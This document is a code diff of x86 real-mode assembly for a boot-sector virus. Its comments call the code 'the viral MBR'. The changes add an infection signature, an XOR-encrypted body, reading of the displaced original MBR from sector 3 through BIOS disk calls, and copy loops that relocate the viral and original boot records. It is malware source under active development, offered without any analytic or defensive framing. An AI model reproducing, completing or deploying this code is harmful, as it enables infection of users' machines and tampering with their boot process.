@@ -57,7 +57,9 @@ mov		ax, 0x7c00
 mov		sp, ax
 sti
 
-
+;cmp byte [load_vx_paint], 0x78
+;xchg bx,bx
+;je $load_vx_paint+4
 
 crypt:
 	push cs
@@ -72,10 +74,16 @@ crypt:
 		xor al, 12h
 		stosb
 		loop crypt_loop
+	jmp $+4
 	
 load_vx_paint:
+;	signature:
+	db 0x78,0x6f,0x78,0x6f
+;	xchg bx,bx
 	mov ax, 0x0		;reset disk
 	int 13h
+
+
 	push cs
 	pop es
 	push cs
@@ -86,7 +94,7 @@ load_vx_paint:
 	mov ds, ax
 
 	;mov cx, 2400
-	mov cx, 0x2a00
+	mov cx, 0x1500
 	push cx
 
 	
@@ -103,69 +111,63 @@ load_vx_paint:
 		mov bx, 0x200
 		int 13h
 		
-		;inc cl
-		;mov byte [sector_count], cl
-		pop cx
-		;mov cx, 2400
-;		call loop
+	pop cx
 
-;	loop:
-;		mov word ax, [bx]
-;		mov word [es:di], ax
-;		add bx,2
-;		add di,2
-;		dec cx
-;		cmp cx, 0
-;		jnz loop
-;;		repnz
-;;		ret
-
-
-;	call loop
-;	jmp idontplaytagb
-	
-	loop:
+	copy_sector_loop:
 		mov word ax, [bx]
-		mov word [es:di], ax
+		stosw
+		;mov word [es:di], ax
 		add bx,2
-		add di,2
+		;add di,2
 		dec cx
 		cmp cx, 0
-		jnz loop
+		jnz copy_sector_loop
 	cmp byte [copy_replay], 0x0
-;	jnz load_OG_mbr
-;	jmp idontplaytagb
 	jz idontplaytagb
+	cmp byte [copy_replay], 0x1
+	jz load_OG_mbr
+	jmp idontplaytagb
 
-;copy_vx_MBR:	
-;	push cs						;copy the code here (the viral MBR) 
-;	pop es						;to address 0000:0x600
-;	mov di, 0x600				;this is typical MBR behavior
-;	mov bx, VX_BOOT ;ax=VXBOOT
-;	mov cx, 0x100
-;	jmp loop	
+copy_vx_MBR:	
+;	xchg bx, bx
+	push cs						;copy the code here (the viral MBR) 
+	pop es						;to address 0000:0x600
+	mov di, 0x600				;this is typical MBR behavior
+	mov bx, VX_BOOT ;ax=VXBOOT
+;	lea bx, VX_BOOT ;ax=VXBOOT
+;	;xor si, si
+	mov byte [copy_replay], 0x1
+;	xchg bx, bx
+	mov cx, 0x100
+	jmp copy_sector_loop	
+
+	;copy original MBR to this address 0000:0x7c00
+	;
 
 load_OG_mbr:
 	mov ax, 0x201	;read one sectors of disk
 	mov ch, 0		;retrieve OG MBR
 	mov cl, 3		;cylinder 0, sector 3 
-;;	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
+	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
 	mov bx, 0x200
 	int 13h
 	
-	;copy original MBR to this address 0000:0x7c00
-	;
-	push cs						;copy the code here (the viral MBR) 
-	pop es						;to address 0000:0x600
-	;mov di, 0x7C00				;this is typical MBR behavior
-	mov di, 0x7e00				;this is typical MBR behavior
-	xor si, si
+
+copy_OG_MBR:
+	;mov ax, 0x07c0
+	;mov es, ax
+	;mov ds, ax
+	push cs
+	pop es
+	mov di, 0x7C00				;this is typical MBR behavior
+	;mov di, 0x7E00				;this is typical MBR behavior
+	mov bx, 0x200
+	xor di, di
 	mov byte [copy_replay], 0x0
-	mov cx, 0x200
-	jmp loop	
+	mov cx, 0x100
+	jmp copy_sector_loop	
 
 idontplaytagb:	
-	;call boot2nd:0 
 	jmp boot2nd:0
 
 ;sector_count:
@@ -184,7 +186,7 @@ cryptlen equ $-crypt
 
 
 copy_replay:
-	db 0x1
+	db 0x2
 
 partition_start:	
 	times 0x1BE-($-$$) db 0
